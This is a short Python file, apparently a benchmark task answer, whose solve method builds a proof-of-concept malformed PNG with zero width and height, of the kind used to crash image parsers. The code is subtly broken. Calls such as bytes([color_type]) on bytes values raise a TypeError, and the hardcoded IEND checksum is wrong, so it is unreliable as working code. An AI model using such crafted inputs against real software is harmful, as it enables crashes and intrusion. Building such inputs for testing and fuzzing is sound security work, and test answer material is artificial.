import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        png_sig = b'\x89PNG\r\n\x1a\n'
        ihdr_len = b'\x00\x00\x00\x0d'
        ihdr_type = b'IHDR'
        width = b'\x00\x00\x00\x00'
        height = b'\x00\x00\x00\x00'
        bit_depth = b'\x08'
        color_type = b'\x02'
        compression = b'\x00'
        filter_method = b'\x00'
        interlace = b'\x00'
        ihdr_data = ihdr_type + width + height + bit_depth + bytes([color_type]) + bytes([compression]) + bytes([filter_method]) + bytes([interlace])
        crc = zlib.crc32(ihdr_data) & 0xffffffff
        ihdr_crc = crc.to_bytes(4, 'big')
        iend_len = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_crc = 0xae42682e
        iend_crc_bytes = iend_crc.to_bytes(4, 'big')
        poc = png_sig + ihdr_len + ihdr_data + ihdr_crc + iend_len + iend_type + iend_crc_bytes
        return poc